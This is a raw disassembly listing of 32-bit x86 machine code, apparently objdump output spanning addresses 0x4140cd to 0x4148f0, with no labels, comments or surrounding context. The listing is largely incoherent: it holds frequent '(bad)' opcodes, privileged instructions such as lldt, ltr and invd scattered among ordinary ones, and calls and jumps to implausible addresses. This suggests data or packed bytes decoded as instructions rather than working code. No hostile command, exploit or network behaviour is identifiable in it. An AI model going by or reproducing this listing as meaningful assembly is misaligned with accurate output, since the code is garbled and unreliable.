  4140cd:	mov    ecx,DWORD PTR [ecx+0xc458b04]
  4140d3:	push   ecx
  4140d4:	jo     0x4140be
  4140d6:	inc    DWORD PTR [edi]
  4140d8:	or     BYTE PTR [eax],al
  4140da:	call   0xcc4824
  4140df:	fmul   QWORD PTR [ebp+0x55]
  4140e2:	mov    eax,DWORD PTR [ebx-0x313ed7c4]
  4140e8:	mov    bh,0x8c
  4140ea:	adc    al,0x9c
  4140ec:	dec    esp
  4140ed:	xor    bl,BYTE PTR [eax]
  4140ef:	mov    ecx,DWORD PTR [ebp+0xc]
  4140f2:	mov    eax,DWORD PTR [ebp-0x4]
  4140f5:	mov    esi,DWORD PTR [edi-0x3148f924]
  4140fb:	push   es
  4140fc:	retf   
  4140fd:	mov    BYTE PTR [ebp-0x30],0x3b
  414101:	inc    ebp
  414102:	movntps XMMWORD PTR [eax-0x741fff77],xmm5
  414109:	retf   0x83fc
  41410c:	into   
  41410d:	dec    ebp
  41410e:	retf   
  41410f:	mov    ecx,DWORD PTR [ebp-0x74]
  414112:	mov    eax,DWORD PTR [eax]
  414114:	fdiv   QWORD PTR [ebx]
  414116:	mov    bh,0x3
  414118:	push   es
  414119:	mov    esi,ecx
  41411b:	sbb    cl,dl
  41411d:	dec    ebp
  41411e:	sar    DWORD PTR [ebx],cl
  414120:	push   ebp
  414121:	jne    0x414132
  414123:	mov    ecx,DWORD PTR [eax-0x74ffff28]
  414129:	lea    ebx,[eax]
  41412b:	call   0xf4caccf2
  414130:	sbb    dh,dl
  414132:	add    edx,ebx
  414134:	push   ebp
  414135:	mov    ecx,DWORD PTR [ebx+0x487238e4]
  41413b:	push   ecx
  41413c:	mov    DWORD PTR [eax-0x30],edx
  41413f:	test   DWORD PTR [edx],eax
  414141:	xadd   esp,esi
  414144:	pop    es
  414145:	add    cl,dl
  414147:	mov    eax,ecx
  414149:	or     al,0x45
  41414b:	(bad)  
  41414c:	push   eax
  41414d:	add    DWORD PTR [edx+0x0],eax
  414150:	add    ecx,DWORD PTR [ecx]
  414152:	and    dh,cl
  414154:	call   0xc54a24
  414159:	add    DWORD PTR [ebp+0x0],edx
  41415c:	mov    esp,DWORD PTR [ebp+0x18]
  41415f:	add    BYTE PTR [eax+0x54],cl
  414162:	xor    eax,DWORD PTR [eax]
  414164:	add    esp,DWORD PTR [esi+0x3b]
  414167:	inc    ebp
  414168:	je     0x4140ed
  41416a:	push   ecx
  41416b:	cli    
  41416c:	dec    ebp
  41416d:	mov    DWORD PTR [ebx],eax
  41416f:	(bad)  
  414170:	or     al,0x5e
  414172:	inc    eax
  414173:	add    BYTE PTR [ebx],al
  414175:	data16 and BYTE PTR [ebp+0x50],al
  414179:	sub    DWORD PTR [ecx],0xfffffff8
  41417c:	add    BYTE PTR [ebp-0x75],ah
  41417f:	add    BYTE PTR [eax],bl
  414181:	enter  0x894d,0x8b
  414185:	int3   
  414186:	loopne 0x41414a
  414188:	rol    BYTE PTR [eax],0x33
  41418b:	lea    cx,[ebp+0xa]
  41418f:	data16 jb 0x4141d7
  414192:	add    BYTE PTR [ebx+0x44890855],cl
  414198:	sbb    ah,al
  41419a:	inc    ebp
  41419b:	lldt   WORD PTR ds:[edx+0x66]
  4141a0:	xor    ecx,DWORD PTR [eax]
  4141a2:	sub    eax,DWORD PTR [ebx+ecx*4]
  4141a5:	add    BYTE PTR [esi+eiz*2],cl
  4141a8:	ror    edx,cl
  4141aa:	dec    ebp
  4141ab:	inc    ebp
  4141ac:	cmp    eax,DWORD PTR [ebx+0x668b0876]
  4141b2:	cld    
  4141b3:	or     BYTE PTR [edi+0x4501dd],dl
  4141b9:	(bad)  
  4141ba:	into   
  4141bb:	out    dx,al
  4141bc:	retf   
  4141bd:	(bad)  
  4141be:	dec    ebp
  4141bf:	mov    al,0x8b
  4141c1:	loop   0x4141e3
  4141c3:	cmp    ecx,DWORD PTR [edx]
  4141c5:	inc    ebp
  4141c6:	daa    
  4141c7:	loop   0x414150
  4141c9:	out    dx,al
  4141ca:	add    edi,eax
  4141cc:	add    BYTE PTR [eax+0x3f52e155],bh
  4141d2:	push   ebp
  4141d3:	inc    ebp
  4141d4:	xor    ebx,esp
  4141d6:	add    ebp,esi
  4141d8:	push   edx
  4141d9:	push   bp
  4141db:	inc    ebp
  4141dc:	(bad)  
  4141dd:	in     eax,dx
  4141de:	push   esp
  4141df:	(bad)  
  4141e0:	inc    edx
  4141e2:	sbb    al,0x33
  4141e4:	ror    BYTE PTR [ebp-0x75fef27c],0x0
  4141eb:	add    BYTE PTR [ebp+0x47],0x8b
  4141ef:	jmp    0xf98b:0x100041c8
  4141f6:	xor    esi,DWORD PTR [edx+0x3]
  4141f9:	mov    ecx,DWORD PTR [edi]
  4141fb:	fmul   DWORD PTR [edx]
  4141fd:	add    BYTE PTR [eax],al
  4141ff:	lea    eax,[ebx-0x4700273c]
  414205:	add    al,0x4f
  414207:	pop    DWORD PTR [eax]
  414209:	add    DWORD PTR [ecx-0x3faa3c00],ecx
  41420f:	push   edx
  414210:	inc    WORD PTR [ebp+0x8]
  414214:	mov    eax,0x514f4d
  414219:	(bad)
  41421d:	add    al,al
  41421f:	xor    DWORD PTR [ebx-0x74baf730],eax
  414225:	test   DWORD PTR [esi+0x74],esp
  414228:	inc    ebp
  414229:	mov    DWORD PTR [eax+0xa4e08],edi
  41422f:	add    BYTE PTR [ecx-0x76c435bb],cl
  414235:	or     dh,cl
  414237:	or     eax,0x8b8d5045
  41423c:	inc    ebp
  41423d:	mov    WORD PTR [ecx+0x3b8a00],?
  414243:	jne    0x414278
  414245:	mov    edi,DWORD PTR [edx+0x8f3b18]
  41424b:	add    DWORD PTR [ebx],eax
  41424d:	add    bh,bh
  41424f:	adc    DWORD PTR [eax],ecx
  414251:	adc    DWORD PTR [ebp+0x55],edi
  414254:	push   es
  414255:	mov    ecx,DWORD PTR [ecx-0x38ff8d70]
  41425b:	mov    ebp,DWORD PTR [eax+ebp*1+0x503a11dc]
  414262:	inc    ebp
  414263:	mov    esp,edi
  414265:	or     al,0xdc
  414267:	push   eax
  414268:	(bad)  
  414269:	jne    0x41421f
  41426b:	call   0x393b5c
  414270:	inc    ebp
  414271:	sar    BYTE PTR [edx],0x84
  414274:	out    dx,al
  414275:	add    bh,al
  414277:	add    BYTE PTR [ebp+esi*2-0x247424],bh
  41427e:	(bad)  
  41427f:	and    al,al
  414281:	fs in  eax,dx
  414283:	inc    DWORD PTR [ebp-0x7b]
  414286:	jo     0x414297
  414288:	leave  
  414289:	scas   al,BYTE PTR es:[edi]
  41428a:	inc    esp
  41428b:	add    BYTE PTR [ebx+ecx*4+0x55f20c10],ch
  414292:	or     BYTE PTR [ebx-0x97717c9],0x83
  414299:	call   DWORD PTR [edi]
  41429b:	shr    ah,0x84
  41429e:	xchg   DWORD PTR [eax],eax
  4142a0:	add    DWORD PTR [eax],eax
  4142a2:	add    bh,bh
  4142a4:	dec    ebp
  4142a5:	and    BYTE PTR [ecx-0x38],dl
  4142a8:	push   eax
  4142a9:	dec    DWORD PTR [ebx+0xfd885]
  4142af:	mov    BYTE PTR [ebp+0x508bac00],cl
  4142b5:	mov    WORD PTR [ecx+0x0],ss
  4142b8:	lea    ecx,[ebx+0x108b20d8]
  4142be:	mov    WORD PTR [edx],ds
  4142c0:	add    BYTE PTR [edi+0xff01ff],al
  4142c6:	mov    ecx,DWORD PTR [ebp-0x28]
  4142c9:	push   ecx
  4142ca:	shl    BYTE PTR [ebp+0x3a],0x8b
  4142ce:	inc    ebp
  4142cf:	in     al,0xeb
  4142d1:	jno    0x41425e
  4142d3:	push   edx
  4142d4:	mov    DWORD PTR [eax-0x28],edx
  4142d7:	mov    eax,DWORD PTR [ebp+0x20]
  4142da:	je     0x414263
  4142dc:	mov    eax,DWORD PTR [ecx]
  4142de:	sbb    BYTE PTR [eax],al
  4142e0:	pop    DWORD PTR [eax]
  4142e2:	add    esi,eax
  4142e4:	add    bl,al
  4142e6:	adc    DWORD PTR [edi],esi
  4142e8:	jmp    0x8bcc933a
  4142ed:	sub    BYTE PTR [ebp+eax*2-0x63c4cf00],cl
  4142f4:	jne    0x414281
  4142f6:	mov    ecx,DWORD PTR [eax]
  4142f8:	in     al,0x75
  4142fa:	pop    DWORD PTR [ecx+0x5501]
  414300:	push   edx
  414301:	inc    DWORD PTR [ebx]
  414303:	adc    BYTE PTR [ecx+0x45721cc6],cl
  414309:	add    BYTE PTR [edi+0x9],dl
  41430c:	call   DWORD PTR [esi]
  41430e:	and    dl,al
  414310:	and    bh,bh
  414312:	inc    edi
  414314:	test   eax,edx
  414316:	sldt   ebx
  414319:	xor    BYTE PTR [eax],al
  41431b:	pushf  
  41431c:	(bad)  
  41431d:	jmp    0x41432b
  41431f:	mov    eax,edi
  414321:	or     al,0x75
  414323:	inc    eax
  414324:	call   0x413a2c
  414329:	mov    eax,eax
  41432b:	loopne 0x4142b1
  41432d:	inc    ebp
  41432e:	add    BYTE PTR [ebx+0x1451c00],cl
  414334:	mov    eax,DWORD PTR [ebp+0x20]
  414337:	add    edi,ecx
  414339:	add    BYTE PTR [eax],ch
  41433b:	cmp    edi,0x18
  41433e:	test   DWORD PTR [ebp+0xf],esi
  414341:	sbb    DWORD PTR [ecx+0x578b0020],0x20
  414348:	jne    0x41434c
  41434a:	call   0xffa03e0f
  41434f:	leave  
  414350:	rcr    BYTE PTR [esp+eax*4],0x55
  414354:	add    ah,ch
  414356:	add    BYTE PTR [edi-0x48fef979],dh
  41435c:	add    BYTE PTR [edx*2+0x75ff3b57],dl
  414363:	inc    esp
  414364:	mov    ebx,DWORD PTR [eax]
  414366:	fcom   st(2)
  414368:	add    BYTE PTR [edi],bl
  41436a:	lea    ecx,[eax-0x18]
  41436d:	(bad)  
  41436e:	push   DWORD PTR [ecx]
  414370:	call   0xffb390d2
  414375:	mov    edx,DWORD PTR [eax+ecx*1-0x1]
  414379:	fstp   DWORD PTR [esi+ebx*8]
  41437c:	push   ebp
  41437d:	pop    ebp
  41437e:	mov    esi,DWORD PTR [edx-0x38]
  414381:	add    DWORD PTR [eax],0x28
  414384:	mov    edi,DWORD PTR [ebx]
  414386:	xor    esi,DWORD PTR [edx+0x3]
  414389:	xor    esi,DWORD PTR [edi+ebx*2-0x75]
  41438d:	pop    ebp
  41438e:	or     al,0x4
  414390:	inc    ecx
  414391:	push   ebp
  414392:	(bad)  
  414393:	in     al,dx
  414394:	or     ah,ch
  414396:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414397:	xbegin 0xffc6b98d
  41439d:	clc    
  41439e:	adc    al,0x45
  4143a0:	div    BYTE PTR [eax]
  4143a2:	or     BYTE PTR [eax+eax*1-0x7e278a39],bl
  4143a9:	test   DWORD PTR [eax+edi*8+0x666300],ebx
  4143b0:	jno    0x414418
  4143b2:	add    eax,DWORD PTR [ebp+0x52]
  4143b5:	adc    eax,0xffffffa0
  4143b8:	xchg   DWORD PTR [ecx+0x4800fc01],ecx
  4143be:	test   DWORD PTR [eax],eax
  4143c0:	clc    
  4143c1:	data16 or al,BYTE PTR [ebp+0x45]
  4143c5:	or     DWORD PTR [ebx-0x3d76d7e0],0xfffffff8
  4143cc:	rol    BYTE PTR [ebp+0x45],1
  4143cf:	mov    DWORD PTR [ebx+0x4d45e0ec],ecx
  4143d5:	mov    DWORD PTR [ecx+0x1845c7e8],ecx
  4143db:	push   ebx
  4143dc:	add    BYTE PTR [ebp+0x0],dl
  4143df:	push   ecx
  4143e0:	jge    0x414415
  4143e2:	add    BYTE PTR [esi+0x4],dl
  4143e5:	jne    0x41444c
  4143e7:	mov    edx,0x457200
  4143ec:	jmp    0x4143b0
  4143ee:	xor    edi,DWORD PTR [ebx]
  4143f0:	pop    edi
  4143f1:	cvtdq2ps xmm7,xmm0
  4143f4:	ret    0x0
  4143f7:	mov    ecx,DWORD PTR [ebx+0x51750ff0]
  4143fd:	xor    ecx,DWORD PTR [edi]
  4143ff:	add    eax,DWORD PTR [ecx+0x3b]
  414402:	push   ebx
  414403:	rdpmc  
  414405:	out    0x8d,al
  414407:	add    BYTE PTR [eax],cl
  414409:	mov    eax,DWORD PTR [ebp-0x743e8b10]
  41440f:	ret    0x450c
  414412:	sbb    al,0x8b
  414414:	cmp    eax,esi
  414416:	or     cl,al
  414418:	or     al,0xc2
  41441a:	pop    eax
  41441b:	inc    ebp
  41441c:	add    ecx,DWORD PTR [edi]
  41441e:	add    esi,DWORD PTR [ebp+0x39]
  414421:	invd   
  414423:	jge    0x41442f
  414425:	mov    eax,0x478ac0
  41442a:	cli    
  41442b:	xor    esp,ecx
  41442d:	mov    ebx,0x5b8ac0
  414432:	ret    0x33
  414435:	mov    eax,0x833b8b
  41443a:	sub    BYTE PTR [ebx],al
  41443c:	inc    ebp
  41443d:	xor    ax,di
  414440:	pushf  
  414441:	inc    bh
  414443:	mov    esp,esp
  414445:	hlt    
  414446:	test   DWORD PTR [ebp-0x8],esi
  414449:	mov    eax,DWORD PTR [ebp-0x14]
  41444c:	xor    ecx,DWORD PTR [ebx-0x76478864]
  414452:	dec    edi
  414453:	or     BYTE PTR [eax],al
  414455:	jne    0x4143e0
  414457:	mov    esi,esp
  414459:	call   0x77a7d01e
  41445e:	inc    ebp
  41445f:	mov    DWORD PTR [eax+0x9c4f0c],edi
  414465:	add    BYTE PTR [ecx-0x3ffe0717],cl
  41446b:	add    BYTE PTR [esi+0x7d],ah
  41446e:	inc    ebp
  41446f:	mov    bx,WORD PTR [ebp+0x8]
  414473:	add    DWORD PTR [ebp+0x55],0x30c008b
  41447a:	inc    ebp
  41447b:	mov    bx,di
  41447e:	lock test BYTE PTR [ecx+0x7000801],bh
  414485:	jge    0x414448
  414487:	mov    ecx,DWORD PTR [ebx-0x630613f0]
  41448d:	cli    
  41448e:	xor    bl,bh
  414490:	add    ecx,DWORD PTR [ebx-0x740ff3a9]
  414496:	test   BYTE PTR [eax],cl
  414498:	add    DWORD PTR [eax+eax*1-0x74ffbb00],eax
  41449f:	cmp    ebp,eax
  4144a1:	xadd   DWORD PTR [ebp+0x66f000c2],ecx
  4144a8:	test   BYTE PTR [ebp+0x1],bh
  4144ab:	mov    ebx,0x458a00
  4144b0:	xor    esi,DWORD PTR [ebx]
  4144b2:	add    esp,DWORD PTR [esi-0x77]
  4144b5:	pop    ebp
  4144b6:	loopne 0x41451e
  4144b8:	inc    ebp
  4144b9:	clc    
  4144ba:	xor    edi,DWORD PTR [ebx]
  4144bc:	add    esi,DWORD PTR [edx-0x77]
  4144bf:	data16 fdivr QWORD PTR [ebp-0x49]
  4144c3:	mov    ebx,0xb78afc
  4144c8:	hlt    
  4144c9:	xor    edi,DWORD PTR [esi]
  4144cb:	data16 add BYTE PTR [ebp+0x66],bl
  4144cf:	data16 lock clc 
  4144d2:	cmp    eax,DWORD PTR ds:[eax]
  4144d5:	ja     0x41453d
  4144d7:	psubq  mm7,QWORD PTR [ebp+0x4]
  4144db:	ltr    WORD PTR [ebp+0x66]
  4144df:	add    esi,eax
  4144e1:	add    di,WORD PTR [ebp+0x2b]
  4144e5:	data16 data16 jge 0x414566
  4144e9:	mov    ebx,0xe08a8b
  4144ee:	jge    0x414523
  4144f0:	data16 data16 xor al,0x5d
  4144f4:	data16 data16 jne 0x4144f0
  4144f8:	mov    edi,DWORD PTR [ebx]
  4144fa:	fdiv   QWORD PTR [edx+0x7d]
  4144fd:	data16 data16 jge 0x414535
  414501:	mov    ebx,0x758a66
  414506:	mov    esi,0x667233
  41450b:	pop    ebp
  41450c:	or     BYTE PTR [esi+0x0],ah
  41450f:	clc    
  414510:	mov    edi,DWORD PTR [ebx]
  414512:	lock ja 0x4144a0
  414515:	(bad)  
  414517:	jge    0x414510
  414519:	invd   
  41451b:	pop    ebp
  41451c:	add    BYTE PTR [ebx],al
  41451e:	(bad)  
  41451f:	cmp    di,WORD PTR [ebp+0xf]
  414523:	data16 sbb bh,BYTE PTR [ebp+0x0]
  414527:	mov    bx,WORD PTR [ebp-0x10]
  41452b:	pop    bp
  41452d:	fbstp  TBYTE PTR [ebx]
  41452f:	test   DWORD PTR [ebx],eax
  414531:	add    BYTE PTR [ebx],bh
  414533:	add    BYTE PTR [esi+0x7d],ah
  414536:	jge    0x4144c3
  414538:	data16 in al,dx
  41453a:	pop    ebp
  41453b:	stc    
  41453c:	bsf    ecx,DWORD PTR [ebp+0x6632009c]
  414543:	mov    edi,ebx
  414545:	in     al,dx
  414546:	test   BYTE PTR [ebp+0x0],bh
  414549:	mov    eax,DWORD PTR [eax]
  41454b:	call   0xbd3e3edb
  414550:	ds pushf 
  414552:	add    BYTE PTR [edx],dh
  414554:	mov    bx,di
  414557:	call   0x8b49c2e7
  41455c:	add    ebp,esp
  41455e:	mov    bx,di
  414561:	jnp    0x414589
  414563:	mov    DWORD PTR [ebx+0x3e7df808],ecx
  414569:	mov    eax,DWORD PTR [eax]
  41456b:	call   0x7c3cd0d6
  414570:	mov    ecx,DWORD PTR [ecx+0x7d030c08]
  414576:	data16 data16 fistp WORD PTR [ebp+0xe]
  41457b:	xor    DWORD PTR [edi-0x48fff7ab],0xfb66f403
  414585:	fisttp WORD PTR [ecx-0x7401f77b]
  41458b:	(bad)  
  41458c:	cld    
  41458d:	jne    0x4145cd
  41458f:	xor    eax,DWORD PTR [eax]
  414591:	mov    esp,DWORD PTR [esi-0x10]
  414594:	sti    
  414595:	repnz mov ebp,DWORD PTR [edi-0xffc76f4]
  41459c:	data16 adc bl,bh
  41459f:	push   ebp
  4145a0:	xor    ecx,DWORD PTR es:[ebx+0x3ee4f88b]
  4145a7:	mov    WORD PTR [eax],es
  4145a9:	pushf  
  4145aa:	data16 xor bh,bl
  4145ad:	mov    DWORD PTR [ebx+0x3550ce4],ecx
  4145b3:	mov    esp,DWORD PTR [esi-0x14]
  4145b6:	fisttp WORD PTR [ebx-0x3748a9f2]
  4145bc:	or     al,0x2b
  4145be:	mov    bh,0xba
  4145c0:	hlt    
  4145c1:	mov    bh,bl
  4145c3:	add    BYTE PTR [ecx-0x7446f3cd],cl
  4145c9:	dec    esi
  4145ca:	or     al,0x0
  4145cc:	mov    edi,DWORD PTR [ebx]
  4145ce:	or     BYTE PTR [ebp+0x3b],dh
  4145d1:	mov    ecx,DWORD PTR [edi]
  4145d3:	fdivr  QWORD PTR [ebx-0x7499ff83]
  4145d9:	xor    al,0xd8
  4145db:	pop    bp
  4145dd:	lock xor esi,DWORD PTR [ebx]
  4145e0:	lea    esp,[esi+0x1f]
  4145e3:	icebp  
  4145e4:	jb     0x4145ea
  4145e6:	add    al,al
  4145e8:	jge    0x4145f6
  4145ea:	mov    eax,eax
  4145ec:	fsubr  st,st(3)
  4145ee:	pop    ebp
  4145ef:	mov    esi,DWORD PTR [ebx]
  4145f1:	in     al,0x8d
  4145f3:	rcr    DWORD PTR [edi],0xc2
  4145f6:	jb     0x414656
  4145f8:	add    cl,cl
  4145fa:	jge    0x414608
  4145fc:	mov    edx,DWORD PTR [ebp-0x20]
  4145ff:	in     al,dx
  414600:	pop    ebp
  414601:	data16 data16 or BYTE PTR [esi+edi*4],bh
  414606:	cmp    di,WORD PTR [ebp+0x0]
  41460a:	mov    ebp,DWORD PTR [ebx]
  41460c:	fdivr  QWORD PTR [esi+0x668a5d]
  414612:	cmp    al,0x33
  414614:	mov    si,0x4e7d
  414618:	mov    eax,DWORD PTR [eax]
  41461a:	lock inc ebp
  41461c:	mov    esi,DWORD PTR [esi]
  41461e:	or     BYTE PTR [edi+esi*8+0x8508ba],bl
  414625:	clc    
  414626:	(bad)  
  414627:	cmp    edi,DWORD PTR [ebx]
  414629:	je     0x41463a
  41462b:	push   ebx
  41462c:	loopne 0x41463d
  41462e:	dec    ecx
  414630:	mov    esp,DWORD PTR [esp+eiz*8-0x33]
  414634:	icebp  
  414635:	mov    esi,0x703084d
  41463a:	pcmpgtd mm6,mm1
  41463d:	add    BYTE PTR [ebp+0x66],dh
  414640:	jmp    0x41460d
  414642:	mov    eax,DWORD PTR [ebx]
  414644:	lock push ebp
  414646:	ror    DWORD PTR [ebp-0x2972feb3],1
  41464c:	or     bh,dl
  41464e:	jb     0x41464e
  414650:	add    BYTE PTR [ebx-0x1a7487b3],cl
  414656:	loopne 0x414658
  414658:	jne    0x41465e
  41465a:	data16 add BYTE PTR [esi+eiz*2],dh
  41465e:	mov    ecx,ebx
  414660:	data16 ds icebp 
  414663:	add    BYTE PTR [esi],bh
  414665:	data16 add bl,cl
  414668:	retw   0xf2
  41466c:	ret    0x66
  41466f:	retf   
  414670:	enterw 0x4df1,0x19
  414675:	pop    edi
  414676:	jne    0x4145f9
  414678:	mov    esi,DWORD PTR [esi]
  41467a:	call   0x77b5d21b
  41467f:	xor    ebp,DWORD PTR [ebx]
  414681:	lea    esp,[esi+0x48]
  414684:	repnz in eax,0x3b
  414687:	add    BYTE PTR [ebp-0x37],dh
  41468a:	xor    edx,DWORD PTR [ebp-0x15]
  41468d:	in     al,dx
  41468e:	xor    edx,DWORD PTR [esi+0x40]
  414691:	mov    DWORD PTR [edi],0x338545fc
  414697:	clc    
  414698:	add    esi,DWORD PTR [ecx]
  41469a:	pop    edi
  41469b:	pushf  
  41469c:	pop    ebx
  41469d:	call   0xff424664
  4146a2:	mov    edi,eax
  4146a4:	push   ecx
  4146a5:	pop    es
  4146a6:	mov    esi,DWORD PTR [edi]
  4146a8:	push   esi
  4146a9:	inc    edi
  4146aa:	add    al,0x70
  4146ac:	add    BYTE PTR [ecx+0x66],ah
  4146af:	(bad)  
  4146b0:	into   
  4146b1:	fs ds int 0x0
  4146b5:	mov    ecx,0x7ce0866
  4146ba:	ret    0x66
  4146bd:	add    bh,al
  4146bf:	add    al,0xfc
  4146c1:	add    BYTE PTR [ebp+0x31c3f866],al
  4146c7:	ds pushf 
  4146c9:	add    BYTE PTR [esi+0x66],ah
  4146cc:	into   
  4146cd:	ret    
  4146ce:	pop    ebp
  4146cf:	adc    al,0x57
  4146d1:	add    BYTE PTR [edi-0x723c409a],dh
  4146d7:	add    edi,edi
  4146d9:	jne    0x414730
  4146db:	lea    edx,[ecx+0x1]
  4146de:	mov    ebx,0xd64ff1
  4146e3:	sar    DWORD PTR [ebx],1
  4146e5:	test   BYTE PTR [ebp+0x38],dh
  4146e8:	mov    DWORD PTR [esp+edi*8-0x76],esp
  4146ec:	push   edi
  4146ed:	xor    BYTE PTR [ebx],0x37
  4146f0:	mov    esi,ebx
  4146f2:	xor    eax,DWORD PTR [eax-0x3c738f9a]
  4146f8:	cmp    BYTE PTR [ebp+0x64],al
  4146fb:	pop    ebx
  4146fc:	mov    ebx,0x9c3b36
  414701:	je     0x41472e
  414703:	xor    edi,DWORD PTR [ebx+0x668a33]
  414709:	mov    WORD PTR [ebx],?
  41470b:	cmp    BYTE PTR [ebx+0x8b4e64],bh
  414711:	pop    edi
  414712:	cmp    ecx,ecx
  414714:	jne    0x41476b
  414716:	mov    ebp,esp
  414718:	cld    
  414719:	push   esi
  41471a:	pop    ebx
  41471b:	inc    ebp
  41471c:	stc    
  41471d:	test   DWORD PTR ss:[eax+edi*8-0x317af642],ebx
  414725:	clc    
  414726:	test   dl,dl
  414728:	cmp    bh,bh
  41472a:	fs pop si
  41472d:	or     bl,al
  41472f:	add    al,0x8b
  414731:	add    BYTE PTR [ecx+0x66],dl
  414734:	push   edi
  414735:	retf   0x3e45
  414738:	add    BYTE PTR ss:[esi+eiz*2-0x3d7a3542],bl
  414740:	clc    
  414741:	add    BYTE PTR [ebx+0x66],bl
  414744:	dec    edx
  414746:	mov    edx,DWORD PTR [edi-0x76]
  414749:	push   edi
  41474a:	add    al,0xb7
  41474c:	xor    al,0xba
  41474e:	cmp    al,0x8d
  414750:	je     0x414751
  414752:	mov    edx,DWORD PTR [ebp-0x46]
  414755:	push   ecx
  414756:	lea    edi,[ebx+0x554fff]
  41475c:	push   ecx
  41475d:	cmp    edx,DWORD PTR [ebx+0x75]
  414760:	mov    ecx,DWORD PTR [ecx+0x723bfcbb]
  414766:	add    BYTE PTR [ebx],dh
  414768:	sub    ecx,DWORD PTR [ebx+0x668a33bb]
  41476e:	add    BYTE PTR [ebx+esi*1+0x4f64bb38],cl
  414775:	mov    ebx,0x3b3b00
  41477a:	jne    0x4147a7
  41477c:	mov    DWORD PTR [ebx+0x728afc],edi
  414782:	xor    esi,DWORD PTR [ebx]
  414784:	mov    edi,DWORD PTR [ebx+0x8d4e33]
  41478a:	push   edi
  41478b:	cmp    esp,ebp
  41478d:	jne    0x41478f
  41478f:	sbb    DWORD PTR [eax],0x8085c3fc
  414795:	clc    
  414796:	inc    edi
  414797:	pop    ebx
  414798:	sti    
  414799:	add    eax,0xeb8bc075
  41479e:	cld    
  41479f:	xor    edi,DWORD PTR ds:0xf8c3855e
  4147a5:	mov    ecx,DWORD PTR [ecx+edx*2]
  4147a8:	rol    DWORD PTR [ebp-0x37],0xf
  4147ac:	mov    DWORD PTR [eax],ecx
  4147ae:	inc    edi
  4147af:	(bad)  
  4147b0:	in     eax,0xfc
  4147b2:	add    bh,bh
  4147b4:	(bad)  
  4147b5:	mov    esi,0xc38a5e
  4147ba:	mov    esi,DWORD PTR [ebx]
  4147bc:	push   ecx
  4147bd:	mov    edi,0xfc4ec7
  4147c2:	test   DWORD PTR [ebp-0x8],edx
  4147c5:	xor    di,ax
  4147c8:	pushf  
  4147c9:	sub    ebp,eax
  4147cb:	inc    ebp
  4147cc:	(bad)  
  4147cd:	sub    edi,edi
  4147cf:	mov    DWORD PTR [ebx+0x3b03ba08],ecx
  4147d5:	inc    ebp
  4147d6:	add    BYTE PTR [esi+0x2b],ah
  4147d9:	or     bh,BYTE PTR [edx+0xf8ac2]
  4147df:	cmp    al,0x33
  4147e1:	mov    edi,DWORD PTR [edx+0xfc4e81]
  4147e7:	(bad)  
  4147e8:	cmp    esi,DWORD PTR [ebx]
  4147ea:	je     0x4147a4
  4147ec:	push   ebx
  4147ed:	dec    esi
  4147ee:	str    ecx
  4147f1:	cmp    esp,DWORD PTR [ebp+esi*2-0x33]
  4147f5:	xor    edi,DWORD PTR [edi+0x789085f]
  4147fb:	mov    edx,DWORD PTR [esp+edi*8]
  4147fe:	add    cl,cl
  414800:	data16 add al,0xcb
  414803:	push   ebp
  414804:	add    ebp,esp
  414806:	jne    0x4147f4
  414808:	(bad)  
  414809:	mov    DWORD PTR [ecx],0xd685f7ec
  41480f:	clc    
  414810:	xlat   BYTE PTR ds:[ebx]
  414811:	inc    ebp
  414812:	mov    esi,DWORD PTR [eax]
  414814:	push   eax
  414815:	pushf  
  414816:	in     eax,0x8b
  414818:	add    ah,ch
  41481a:	add    al,0x55
  41481c:	add    BYTE PTR [ecx+0x66],dl
  41481f:	add    eax,0x3e72cb
  414824:	add    BYTE PTR [ebp+0x66],al
  414827:	(bad)  
  414828:	retf   
  414829:	lock ret 0x85
  41482d:	clc    
  41482e:	inc    bp
  414830:	retf   
  414831:	cmp    eax,0xc77d9cc8
  414836:	ss cld 
  414838:	pushf  
  414839:	test   DWORD PTR [edi-0x8],ebx
  41483c:	je     0x414883
  41483e:	xor    esi,DWORD PTR ds:0x7020840
  414844:	ror    BYTE PTR [ebp-0x37],0x8d
  414848:	push   ebp
  414849:	add    esp,ebp
  41484b:	jb     0x4147d8
  41484d:	add    BYTE PTR [eax],cl
  41484f:	dec    ebp
  414850:	mov    bh,0x81
  414852:	push   esi
  414853:	push   ebp
  414854:	adc    DWORD PTR [ecx-0x3c],0x3e9cff81
  41485b:	xor    al,BYTE PTR [eax]
  41485d:	mov    edx,DWORD PTR [edi+0x10]
  414860:	(bad)  
  414861:	scas   eax,DWORD PTR es:[edi]
  414862:	ret    0x3b
  414865:	jns    0x3b424558
  41486b:	mov    esi,DWORD PTR [eax+edx*1-0x75]
  41486f:	dec    ebp
  414870:	or     BYTE PTR [ebx],ch
  414872:	ret    0x458b
  414875:	lock jmp 0x414869
  414878:	mov    ecx,DWORD PTR [eax]
  41487a:	or     BYTE PTR [edi],al
  41487c:	mov    ecx,eax
  41487e:	xor    DWORD PTR [edx+0x2],0x0
  414882:	mov    bh,0xc1
  414884:	adc    BYTE PTR [eax],dh
  414886:	iret   
  414887:	inc    ebp
  414888:	mov    DWORD PTR [ebx],0x4dfff8c4
  41488e:	inc    BYTE PTR [ebx]
  414890:	ret    0xf8
  414893:	adc    DWORD PTR [esi+0x10],esp
  414896:	clc    
  414897:	dec    ecx
  414898:	fisttp WORD PTR [ecx+0x456604c0]
  41489e:	add    dh,BYTE PTR ds:0x75e0845
  4148a4:	ret    0x4d
  4148a7:	lea    ecx,[ebx+0x18728301]
  4148ad:	add    BYTE PTR [ebp+0x45],al
  4148b0:	xor    ecx,ebp
  4148b2:	pushf  
  4148b3:	add    bh,al
  4148b5:	add    al,ch
  4148b7:	inc    ebp
  4148b8:	test   DWORD PTR [ebx-0x3eba0708],ecx
  4148be:	xor    eax,0x781084d
  4148c3:	push   ebp
  4148c4:	pushf  
  4148c5:	push   ecx
  4148c6:	xor    al,BYTE PTR [ecx+0x32f89c89]
  4148cc:	inc    ebp
  4148cd:	cmp    edi,DWORD PTR [ecx]
  4148cf:	jbe    0x41486d
  4148d1:	mov    eax,edi
  4148d3:	or     ah,dh
  4148d5:	inc    ebp
  4148d6:	test   DWORD PTR [ebx+0x4d450cf8],ecx
  4148dc:	xor    ecx,DWORD PTR [ebx-0x74747664]
  4148e2:	in     al,dx
  4148e3:	hlt    
  4148e4:	push   ebp
  4148e5:	push   ebp
  4148e6:	push   ecx
  4148e7:	push   ecx
  4148e8:	mov    ecx,DWORD PTR [ebx-0x7b7b0708]
  4148ee:	pushf  
  4148ef:	pushf  
  4148f0:	xor    dh,BYTE PTR [edx]
